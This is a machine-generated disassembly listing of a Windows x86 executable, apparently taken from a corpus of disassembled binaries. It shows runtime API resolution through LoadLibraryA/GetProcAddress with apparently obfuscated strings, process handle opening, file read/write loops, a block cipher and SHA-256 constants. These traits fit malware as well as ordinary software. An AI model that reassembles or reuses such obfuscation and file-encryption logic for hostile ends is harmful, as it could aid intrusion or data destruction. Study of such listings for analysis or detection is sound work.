cmp [ esi + 0x18 ] 0x0
je r-xdata
xor eax eax
push rw-data
call sub_402a88
pop ecx
push eax
push [ esi + 0x19 ]
call edi
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
xor eax eax
push rw-data
call sub_402a88
pop ecx
push eax
push [ esi + 0x1d ]
call edi
test eax eax
mov [ esi + 0x10 ] eax
je r-xdata
xor eax eax
push rw-data
call sub_402a88
pop ecx
push eax
push [ esi + 0x19 ]
call edi
test eax eax
mov [ esi + 0x8 ] eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
xor eax eax
push rw-data
call sub_402a88
pop ecx
push eax
push [ esi + 0x1d ]
call edi
test eax eax
mov [ esi + 0x14 ] eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
xor eax eax
push rw-data
call sub_402a88
pop ecx
push eax
push [ esi + 0x19 ]
call edi
test eax eax
mov [ esi + 0xc ] eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
test al al
mov [ esi + 0x18 ] al
je r-xdata
xor eax eax
inc eax
jmp r-xdata
test al al
mov [ esi + 0x18 ] al
je r-xdata
xor eax eax
inc eax
jmp r-xdata
test al al
mov [ esi + 0x18 ] al
je r-xdata
mov [ esi + 0x18 ] al
mov [ esi + 0x18 ] al
sub_4056a3
push ebx
xor eax eax
xor bl bl
cmp [ esp + 0xc ] eax
jle r-xdata
pop ebx
retn
push esi
mov ecx [ esp + 0xc ]
lea esi [ eax + ecx ]
call sub_405fc3
movzx eax al
cdq
push 0x19
pop ecx
idiv ecx
mov [ esi + 0x1 ] 0x0
add dl 0x61
inc bl
movzx eax bl
cmp eax [ esp + 0x10 ]
mov [ esi ] dl
jl r-xdata
pop esi
sub_4056db
push ebp
mov ebp esp
sub esp 0x5038
and [ ebp - 0x1b ] 0x0
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0x1c ] 0x0
call sub_405567
test al al
jne r-xdata
push ebx
lea eax [ ebp - 0x8 ]
push eax
mov ebx 0x1000
push ebx
lea eax [ ebp - 0x5038 ]
push eax
call [ ebp - 0x34 ]
test eax eax
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
shr eax 0x2
dec eax
and [ ebp - 0xc ] 0x0
push esi
mov [ ebp - 0x8 ] eax
push edi
xor bl bl
push esi
push 0x0
push 0x410
call [ ebp - 0x24 ]
mov esi eax
test esi esi
je r-xdata
lea eax [ edi + 0x1 ]
xor edx edx
div [ ebp - 0x8 ]
mov esi [ ebp + edx * 4 - 0x5038 ]
inc [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0x10
jl r-xdata
lea eax [ ebp - 0x38 ]
push eax
push 0x4
lea eax [ ebp - 0x10 ]
push eax
push esi
call [ ebp - 0x30 ]
test eax eax
jne r-xdata
call sub_405fc3
xor edx edx
div [ ebp - 0x8 ]
mov edi edx
mov esi [ ebp + edi * 4 - 0x5038 ]
call [ ebp - 0x20 ]
cmp esi eax
jne r-xdata
jmp r-xdata
push ebx
lea eax [ ebp - 0x1038 ]
push eax
push [ ebp - 0x10 ]
push esi
call [ ebp - 0x2c ]
mov al [ ebp - 0x1038 ]
mov edx [ ebp + 0x8 ]
lea ecx [ ebp - 0x1038 ]
mov bl [ ebp - 0x1 ]
pop edi
pop esi
jmp r-xdata
mov [ edx ] 0x0
mov [ ebp - 0x1 ] 0x1
cmp al 0x2e
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_405687
mov al bl
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
je r-xdata
inc ecx
mov [ edx ] al
mov al [ ecx ]
inc edx
dec [ ebp + 0xc ]
jmp r-xdata
test al al
je r-xdata
sub_4057d6
push esi
push edi
push rw-data
xor edi edi
call sub_402a88
pop ecx
push eax
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
retn
push rw-data
call sub_402a88
pop ecx
push eax
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push esi
call [ FreeLibrary@IAT ]
mov ecx [ esp + 0x10 ]
imul ecx [ esp + 0x14 ]
push ecx
push 0x8
push [ esp + 0x14 ]
call eax
mov edi eax
sub_405829
push esi
push rw-data
call sub_402a88
pop ecx
push eax
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
pop esi
retn
push rw-data
call sub_402a88
pop ecx
push eax
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push esi
call [ FreeLibrary@IAT ]
push [ esp + 0xc ]
push 0x0
push [ esp + 0x10 ]
call eax
sub_40586e
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
lea ecx [ eax + esi + 0x4 ]
mov eax [ ecx ]
push 0x8
push rw-data
call [ eax ]
or [ esi ] 0xffffffff
and [ esi + 0x30 ] 0x0
pop esi
retn
sub_40589e
push esi
push edi
mov edi [ esp + 0xc ]
push 0x0
push 0x0
mov esi ecx
push edi
push [ esi ]
call [ SetFilePointer@IAT ]
cmp eax edi
je r-xdata
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
lea ecx [ eax + esi + 0x4 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
test edi edi
jbe r-xdata
xor al al
jmp r-xdata
mov al 0x1
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
lea ecx [ eax + esi + 0x4 ]
mov eax [ ecx ]
push 0x0
call [ eax + 0x8 ]
dec edi
jne r-xdata
pop edi
pop esi
retn 0x4
sub_4058e9
push esi
push edi
mov edi [ esp + 0xc ]
push 0x1
push 0x0
mov esi ecx
push edi
push [ esi ]
call [ SetFilePointer@IAT ]
test eax eax
jge r-xdata
test edi edi
jbe r-xdata
xor al al
jmp r-xdata
mov al 0x1
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
lea ecx [ eax + esi + 0x4 ]
mov eax [ ecx ]
push 0x0
call [ eax + 0x8 ]
dec edi
jne r-xdata
pop edi
pop esi
retn 0x4
sub_405925
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
xor eax eax
push eax
push 0x80
push 0x3
push eax
push 0x1
push 0x80000000
push [ esp + 0x20 ]
mov [ ecx + esi + 0x34 ] eax
call [ CreateFileA@IAT ]
mov ecx [ esi + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + esi + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + esi + 0x4 ] 0xffffffff
pop esi
setne al
retn 0x4
sub_40596a
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
mov esi ecx
mov eax [ esi + 0x4 ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push [ eax + esi + 0x4 ]
call [ ReadFile@IAT ]
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x4 ]
lea eax [ eax + esi + 0x34 ]
add [ eax ] ecx
mov eax [ ebp - 0x4 ]
pop esi
leave
retn 0x8
sub_4059a8
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
lea eax [ eax + esi + 0x4 ]
push 0x0
push [ eax ]
call [ GetFileSize@IAT ]
mov ecx [ esi + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + esi + 0x34 ] eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
push [ eax + esi + 0x4 ]
call [ CloseHandle@IAT ]
mov al 0x1
pop esi
retn
sub_4059fd
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push [ ebp + 0xc ]
mov esi ecx
mov eax [ esi ]
push ebx
call [ eax + 0x4 ]
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
push edi
xor edi edi
test eax eax
jbe r-xdata
mov eax [ ebp + 0xc ]
pop edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0x8 ]
mov ecx [ ecx + 0x4 ]
movzx edx [ edi + ebx ]
add ecx eax
lea ecx [ ecx + esi + 0x8 ]
mov eax [ ecx ]
push edx
call [ eax + 0x8 ]
mov [ edi + ebx ] al
inc edi
cmp edi [ ebp + 0x8 ]
jb r-xdata
sub_405a4e
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
xor eax eax
push eax
push 0x80
push 0x2
push eax
push 0x1
push 0x40000000
push [ esp + 0x20 ]
mov [ ecx + esi + 0x34 ] eax
call [ CreateFileA@IAT ]
mov ecx [ esi + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + esi + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + esi + 0x4 ] 0xffffffff
pop esi
setne al
retn 0x4
sub_405a93
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
mov esi ecx
mov eax [ esi + 0x4 ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push [ eax + esi + 0x4 ]
call [ WriteFile@IAT ]
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x4 ]
lea eax [ eax + esi + 0x34 ]
add [ eax ] ecx
mov eax [ ebp - 0x4 ]
pop esi
leave
retn 0x8
sub_405ad1
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
xor edi edi
cmp [ esp + 0x14 ] edi
mov esi ecx
jle r-xdata
push [ esp + 0x14 ]
mov eax [ esi ]
push ebx
mov ecx esi
call [ eax + 0x4 ]
pop edi
pop esi
pop ebx
retn 0x8
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0x8 ]
mov ecx [ ecx + 0x4 ]
movzx edx [ edi + ebx ]
add ecx eax
lea ecx [ ecx + esi + 0x8 ]
mov eax [ ecx ]
push edx
call [ eax + 0x8 ]
mov [ edi + ebx ] al
inc edi
cmp edi [ esp + 0x14 ]
jl r-xdata
sub_405b20
push esi
push [ esp + 0x8 ]
mov esi ecx
mov eax [ esi ]
call [ eax ]
test al al
je r-xdata
pop esi
retn 0x4
push edi
lea edi [ esi + 0x4 ]
push 0x30
push edi
call sub_405388
pop ecx
pop ecx
call [ GetProcessHeap@IAT ]
push 0x1e
push 0x0
push 0x9
push edi
mov [ esi + 0x30 ] eax
mov [ esi + 0x28 ] sub_4057d6
mov [ esi + 0x2c ] sub_405829
call sub_40b5f0
test eax eax
setge al
pop edi
sub_405b6a
push ebp
mov ebp esp
sub esp 0x8004
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov edi [ Sleep@IAT ]
push 0x32
mov esi ecx
call edi
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
test eax eax
lea ebx [ esi + 0x4 ]
mov [ ebx ] ecx
lea ecx [ ebp - 0x8004 ]
mov [ esi + 0x8 ] eax
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] 0x8000
je r-xdata
mov eax [ ebp - 0x4 ]
lea eax [ ebp - 0x8004 ]
push 0x5
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0x8000
call edi
push 0x0
push ebx
call sub_40b9c0
test eax eax
jl r-xdata
mov eax [ esi + 0x14 ]
lea ecx [ ebp - 0x8004 ]
sub eax ecx
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx [ esi ]
push eax
mov eax ecx
push eax
mov ecx esi
call [ edx + 0x4 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
add [ ebp - 0x4 ] eax
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_405bfb
push ebp
mov ebp esp
sub esp 0x8000
push esi
mov esi ecx
push edi
lea edi [ esi + 0x4 ]
push edi
call sub_40c3d0
mov eax [ esi ]
mov ecx esi
call [ eax + 0x8 ]
mov eax [ esi + 0x14 ]
lea ecx [ ebp - 0x8000 ]
sub eax ecx
je r-xdata
mov edx [ esi ]
push eax
mov eax ecx
push eax
mov ecx esi
call [ edx + 0x4 ]
test eax eax
jne r-xdata
and [ edi ] 0x0
and [ esi + 0x8 ] 0x0
push 0x2
lea eax [ ebp - 0x8000 ]
push edi
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0x8000
call sub_40b9c0
test eax eax
jl r-xdata
xor al al
jmp r-xdata
pop edi
pop esi
leave
retn
sub_405c5f
push esi
push 0x20
push [ esp + 0xc ]
mov esi ecx
lea eax [ esi + 0x104 ]
push eax
call sub_405366
push 0x20
push [ esp + 0x1c ]
add esi 0x124
push esi
call sub_405366
add esp 0x18
pop esi
retn 0x8
sub_405c8d
push esi
mov esi ecx
lea eax [ esi + 0x104 ]
push eax
lea ecx [ esi + 0x4 ]
call sub_401000
push [ esp + 0x8 ]
mov eax [ esi ]
and [ esi + 0x144 ] 0x0
mov ecx esi
call [ eax ]
pop esi
retn 0x4
sub_405cb4
push ebp
mov ebp esp
sub esp 0x18
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x8 ] 0x0
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x10
mov esi ecx
pop ebx
sub ebx [ esi + 0x144 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
add ecx eax
cmp edi ebx
mov eax [ esi + 0x144 ]
lea eax [ esi + eax + 0x134 ]
jge r-xdata
push ebx
push ecx
push eax
call sub_405366
and [ esi + 0x144 ] 0x0
add [ ebp - 0x4 ] ebx
add esp 0xc
push 0x10
lea eax [ ebp - 0x18 ]
push eax
lea eax [ esi + 0x134 ]
push eax
lea eax [ esi + 0x124 ]
push eax
lea ecx [ esi + 0x4 ]
call sub_401fdf
mov eax [ esi ]
push 0x10
lea ecx [ ebp - 0x18 ]
push ecx
mov ecx esi
call [ eax + 0x4 ]
mov edi [ ebp + 0xc ]
add [ ebp - 0x8 ] eax
push 0x10
pop ebx
sub ebx [ esi + 0x144 ]
sub edi [ ebp - 0x4 ]
push edi
push ecx
push eax
call sub_405366
mov eax [ ebp - 0x8 ]
add esp 0xc
add [ esi + 0x144 ] edi
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_405d59
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi ecx
mov eax [ esi + 0x144 ]
push 0x10
pop ecx
sub ecx eax
push ecx
lea eax [ eax + esi + 0x134 ]
push eax
call sub_405388
pop ecx
pop ecx
push 0x10
lea eax [ ebp - 0x10 ]
push eax
lea eax [ esi + 0x134 ]
push eax
lea eax [ esi + 0x124 ]
push eax
lea ecx [ esi + 0x4 ]
call sub_401fdf
mov eax [ esi ]
push 0x10
lea ecx [ ebp - 0x10 ]
push ecx
mov ecx esi
call [ eax + 0x4 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x8 ]
pop esi
leave
retn
sub_405db0
push ebp
mov ebp esp
sub esp 0x1000
push esi
mov esi ecx
lea eax [ esi + 0x118c ]
push edi
push eax
call sub_404b23
lea eax [ esi + 0x18c ]
push eax
lea edi [ esi + 0x11e4 ]
push edi
call sub_402046
add esp 0xc
lea eax [ esi + 0x1204 ]
push eax
push edi
lea ecx [ esi + 0x10 ]
call sub_405c5f
push [ ebp + 0x8 ]
lea ecx [ esi + 0x158 ]
call sub_405b20
test al al
je r-xdata
pop edi
pop esi
leave
retn 0x8
call sub_405fc3
mov edi eax
call sub_405fc3
xor ecx ecx
add edi eax
mov [ ebp + ecx * 4 - 0x1000 ] edi
inc ecx
cmp ecx 0x400
jb r-xdata
push 0x0
push [ ebp + 0xc ]
lea eax [ esi + 0x2ad ]
push eax
call sub_409cdd
add esp 0xc
push 0x1000
lea eax [ ebp - 0x1000 ]
push eax
lea ecx [ esi + 0x8 ]
call sub_405ad1
test eax eax
setne al
sub_405e54
push esi
push [ esp + 0xc ]
mov esi ecx
push [ esp + 0xc ]
lea eax [ esi + 0x118c ]
push eax
call sub_40522c
add esp 0xc
push [ esp + 0xc ]
lea ecx [ esi + 0x158 ]
push [ esp + 0xc ]
call sub_405b6a
pop esi
retn 0x8
sub_405e85
push esi
mov esi ecx
push edi
lea eax [ esi + 0x118c ]
push eax
lea edi [ esi + 0x12e4 ]
push edi
call sub_405319
pop ecx
pop ecx
lea ecx [ esi + 0x158 ]
call sub_405bfb
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
push 0x0
lea ecx [ eax + esi + 0x4 ]
call sub_40589e
push 0x10
lea eax [ esi + 0x28c ]
push eax
push edi
call sub_40a358
add esp 0xc
push 0x1000
lea eax [ esi + 0x18c ]
push eax
lea ecx [ esi + 0x8 ]
mov [ esi + 0x2ac ] 0x9
call sub_405ad1
pop edi
mov ecx esi
pop esi
jmp sub_4059a8
sub_405f68
push esi
push edi
push ecx
push ebx
push edx
xor ebx ebx
mov edi [ esp + 0x18 ]
mov esi [ esp + 0x1c ]
mov bx [ esp + 0x20 ]
xor edx edx
xor eax eax
mov ax [ esi + 0x6 ]
div ebx
mov [ edi + 0x6 ] ax
mov eax edx
shl eax 0x10
mov ax [ esi + 0x4 ]
xor edx edx
div ebx
mov [ edi + 0x4 ] ax
mov eax edx
shl eax 0x10
mov ax [ esi + 0x2 ]
xor edx edx
div ebx
mov [ edi + 0x2 ] ax
mov eax edx
shl eax 0x10
mov ax [ esi ]
xor edx edx
div ebx
mov [ edi ] ax
mov eax edx
pop edx
pop ebx
pop ecx
pop edi
pop esi
retn
sub_405fc3
push ebp
mov ebp esp
sub esp 0x8030
push esi
push edi
call [ GetTickCount@IAT ]
mov [ ebp - 0x8 ] eax
call [ GetCurrentProcessId@IAT ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
lea eax [ ebp - 0x30 ]
push eax
call [ GlobalMemoryStatus@IAT ]
push 0x8
lea eax [ ebp - 0x10 ]
push eax
mov esi rw-data
push esi
call sub_408e38
push 0x4
lea eax [ ebp - 0x4 ]
push eax
push esi
call sub_408e38
push 0x4
lea eax [ ebp - 0x8 ]
push eax
push esi
call sub_408e38
push 0x20
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_408e38
push 0x4
push rw-data
push esi
call sub_408e38
push 0x20
mov edi rw-data
push edi
push esi
call sub_408e38
add esp 0x48
push 0x8000
lea eax [ ebp - 0x8030 ]
push eax
push esi
call sub_408e38
push edi
push esi
call sub_408ece
mov eax [ rw-data ]
add esp 0x14
inc eax
mov [ rw-data ] eax
and eax 0x7
mov eax [ eax * 4 + rw-data ]
pop edi
pop esi
leave
retn
sub_40609d
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
lea ecx [ eax + 0x1b90 ]
call sub_40b454
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea ecx [ eax + 0x1b90 ]
call sub_40b454
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
lea ecx [ eax + 0x1b90 ]
call sub_40b454
mov esi [ esi + 0x10 ]
test esi esi
je r-xdata
lea ecx [ eax + 0x230 ]
call sub_40b454
pop esi
retn
lea ecx [ esi + 0x1b90 ]
pop esi
jmp sub_40b454
sub_406192
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
lea ecx [ eax + 0x1b90 ]
call sub_40b42a
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea ecx [ eax + 0x1b90 ]
call sub_40b42a
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
lea ecx [ eax + 0x1b90 ]
call sub_40b42a
mov esi [ esi + 0x10 ]
test esi esi
je r-xdata
call sub_40607c
pop esi
retn
lea ecx [ esi + 0x1b90 ]
pop esi
jmp sub_40b42a
sub_40627b
push esi
push edi
mov esi ecx
call sub_409899
lea edi [ esi + 0x1b90 ]
mov ecx edi
call sub_406137
mov [ edi ] rw-data
pop edi
mov [ esi ] rw-data
mov eax esi
pop esi
retn
sub_4062a2
push esi
push edi
mov esi ecx
call sub_409899
lea edi [ esi + 0x1b90 ]
mov ecx edi
call sub_40455d
mov [ edi ] rw-data
mov [ edi ] rw-data
pop edi
mov [ esi ] rw-data
mov eax esi
pop esi
retn
sub_4062e5
push esi
push edi
mov esi ecx
call sub_409899
lea edi [ esi + 0x1b90 ]
mov ecx edi
call sub_40455d
mov [ edi ] rw-data
mov [ edi ] rw-data
pop edi
mov [ esi ] rw-data
mov eax esi
pop esi
retn
sub_406323
push esi
push edi
mov esi ecx
call sub_409899
lea edi [ esi + 0x1b90 ]
mov ecx edi
call sub_40455d
mov [ edi ] rw-data
mov [ edi ] rw-data
pop edi
mov [ esi ] rw-data
mov eax esi
pop esi
retn
sub_406361
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
call sub_406243
push [ esi ]
call sub_405354
pop ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
call sub_40625f
push [ esi + 0x8 ]
call sub_405354
pop ecx
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
call sub_40625f
push [ esi + 0x4 ]
call sub_405354
pop ecx
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
call sub_403ca2
push [ esi + 0xc ]
call sub_405354
pop ecx
pop esi
retn
call sub_40625f
push [ esi + 0x10 ]
call sub_405354
pop ecx
sub_4063cd
push ebp
mov ebp esp
sub esp 0x1000
push esi
push edi
push 0x3d
mov edi 0x1000
push edi
lea eax [ ebp - 0x1000 ]
push eax
push rw-data
mov esi ecx
call sub_402a88
pop ecx
push eax
push [ ebp + 0x8 ]
call sub_40a1d9
add esp 0x14
test al al
je r-xdata
push ebx
push 0x3d
push edi
lea eax [ ebp - 0x1000 ]
push eax
push rw-data
call sub_402a88
pop ecx
push eax
push [ ebp + 0x8 ]
call sub_40a1d9
add esp 0x14
test al al
mov ebx 0x1db8
je r-xdata
push 0x1dbc
call sub_405340
pop ecx
mov ecx eax
mov [ esi ] eax
call sub_40627b
push [ ebp + 0x8 ]
mov ecx [ esi ]
call sub_406224
push 0x3d
push edi
lea eax [ ebp - 0x1000 ]
push eax
push rw-data
call sub_402a88
pop ecx
push eax
push [ ebp + 0x8 ]
call sub_40a1d9
add esp 0x14
test al al
je r-xdata
push ebx
call sub_405340
pop ecx
mov ecx eax
mov [ esi + 0x8 ] eax
call sub_4062a2
push [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
call sub_406154
push 0x3d
push edi
lea eax [ ebp - 0x1000 ]
push eax
push rw-data
call sub_402a88
pop ecx
push eax
push [ ebp + 0x8 ]
call sub_40a1d9
add esp 0x14
test al al
je r-xdata
push ebx
call sub_405340
pop ecx
mov ecx eax
mov [ esi + 0x4 ] eax
call sub_4062e5
push [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
call sub_406173
push 0x3d
push edi
lea eax [ ebp - 0x1000 ]
push eax
push rw-data
call sub_402a88
pop ecx
push eax
push [ ebp + 0x8 ]
call sub_40a1d9
add esp 0x14
test al al
pop ebx
je r-xdata
push ebx
call sub_405340
pop ecx
mov ecx eax
mov [ esi + 0x10 ] eax
call sub_406323
push [ ebp + 0x8 ]
mov ecx [ esi + 0x10 ]
call sub_406118
pop edi
pop esi
leave
retn 0x4
push 0x250
call sub_405340
pop ecx
mov ecx eax
mov [ esi + 0xc ] eax
call sub_403a1b
push [ ebp + 0x8 ]
mov ecx [ esi + 0xc ]
call sub_403a78
sub_40657b
push ebp
mov ebp esp
sub esp 0x11c
mov eax [ ebp + 0xc ]
xor ecx ecx
mov ch [ eax ]
movzx edx [ eax + 0x2 ]
push ebx
push esi
push edi
mov cl [ eax + 0x1 ]
shl ecx 0x8
or ecx edx
shl ecx 0x8
movzx edx [ eax + 0x3 ]
or ecx edx
mov [ ebp - 0x11c ] ecx
xor ecx ecx
mov ch [ eax + 0x4 ]
movzx edx [ eax + 0x6 ]
mov cl [ eax + 0x5 ]
shl ecx 0x8
or ecx edx
shl ecx 0x8
movzx edx [ eax + 0x7 ]
or ecx edx
mov [ ebp - 0x118 ] ecx
xor ecx ecx
mov ch [ eax + 0x8 ]
movzx edx [ eax + 0xa ]
mov cl [ eax + 0x9 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0xb ]
shl ecx 0x8
or ecx edx
mov [ ebp - 0x114 ] ecx
xor ecx ecx
mov ch [ eax + 0xc ]
movzx edx [ eax + 0xe ]
mov cl [ eax + 0xd ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0xf ]
shl ecx 0x8
or ecx edx
mov [ ebp - 0x110 ] ecx
xor ecx ecx
mov ch [ eax + 0x10 ]
movzx edx [ eax + 0x12 ]
mov cl [ eax + 0x11 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x13 ]
shl ecx 0x8
or ecx edx
mov [ ebp - 0x10c ] ecx
xor ecx ecx
mov ch [ eax + 0x14 ]
movzx edx [ eax + 0x16 ]
mov cl [ eax + 0x15 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x17 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x1a ]
mov [ ebp - 0x108 ] ecx
xor ecx ecx
mov ch [ eax + 0x18 ]
mov cl [ eax + 0x19 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x1b ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x1e ]
mov [ ebp - 0x104 ] ecx
xor ecx ecx
mov ch [ eax + 0x1c ]
mov cl [ eax + 0x1d ]
shl ecx 0x8
or ecx edx
shl ecx 0x8
movzx edx [ eax + 0x1f ]
or ecx edx
mov [ ebp - 0x100 ] ecx
xor ecx ecx
mov ch [ eax + 0x20 ]
movzx edx [ eax + 0x22 ]
mov cl [ eax + 0x21 ]
shl ecx 0x8
or ecx edx
shl ecx 0x8
movzx edx [ eax + 0x23 ]
or ecx edx
mov [ ebp - 0xfc ] ecx
xor ecx ecx
mov ch [ eax + 0x24 ]
movzx edx [ eax + 0x26 ]
mov cl [ eax + 0x25 ]
shl ecx 0x8
or ecx edx
shl ecx 0x8
movzx edx [ eax + 0x27 ]
or ecx edx
mov [ ebp - 0xf8 ] ecx
xor ecx ecx
mov ch [ eax + 0x28 ]
movzx edx [ eax + 0x2a ]
mov cl [ eax + 0x29 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x2b ]
shl ecx 0x8
or ecx edx
mov [ ebp - 0xf4 ] ecx
xor ecx ecx
mov ch [ eax + 0x2c ]
movzx edx [ eax + 0x2e ]
mov cl [ eax + 0x2d ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x2f ]
shl ecx 0x8
or ecx edx
mov [ ebp - 0xf0 ] ecx
xor ecx ecx
mov ch [ eax + 0x30 ]
movzx edx [ eax + 0x32 ]
mov cl [ eax + 0x31 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x33 ]
shl ecx 0x8
or ecx edx
mov [ ebp - 0xec ] ecx
xor ecx ecx
mov ch [ eax + 0x34 ]
movzx edx [ eax + 0x36 ]
mov cl [ eax + 0x35 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x37 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x3a ]
mov [ ebp - 0xe8 ] ecx
xor ecx ecx
mov ch [ eax + 0x38 ]
mov cl [ eax + 0x39 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x3b ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x3e ]
mov [ ebp - 0xe4 ] ecx
xor ecx ecx
mov ch [ eax + 0x3c ]
mov cl [ eax + 0x3d ]
movzx eax [ eax + 0x3f ]
shl ecx 0x8
or ecx edx
shl ecx 0x8
or ecx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0x1c ]
mov [ ebp - 0xe0 ] ecx
mov ecx [ eax + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + 0x10 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x18 ]
mov edx [ eax + 0x8 ]
mov edi ecx
ror edi 0xb
mov ebx ecx
rol ebx 0x7
xor edi ebx
mov ebx ecx
ror ebx 0x6
xor edi ebx
add edi [ eax + 0x24 ]
mov ebx [ eax + 0x20 ]
xor ebx esi
and ebx ecx
xor ebx [ eax + 0x20 ]
mov esi [ ebp - 0x11c ]
add ebx edi
mov edi [ eax + 0x14 ]
lea esi [ ebx + esi + 0x428a2f98 ]
add edi esi
mov [ ebp + 0x8 ] edi
mov ebx [ ebp - 0xc ]
mov [ ebp + 0xc ] esi
mov edi edx
ror edi 0xd
and ebx edx
mov esi edx
rol esi 0xa
xor edi esi
mov esi edx
ror esi 0x2
xor edi esi
add edi [ ebp + 0xc ]
mov esi [ ebp - 0xc ]
or esi edx
and esi [ ebp - 0x10 ]
mov [ ebp - 0x18 ] edx
or esi ebx
mov ebx [ ebp + 0x8 ]
add esi edi
mov edi [ ebp + 0x8 ]
ror edi 0xb
rol ebx 0x7
xor edi ebx
mov ebx [ ebp + 0x8 ]
ror ebx 0x6
xor edi ebx
mov ebx [ eax + 0x1c ]
add edi [ eax + 0x20 ]
xor ebx ecx
and ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x118 ]
xor ebx [ eax + 0x1c ]
mov [ ebp - 0x8 ] esi
add ebx edi
lea ecx [ ebx + ecx + 0x71374491 ]
add [ ebp - 0x10 ] ecx
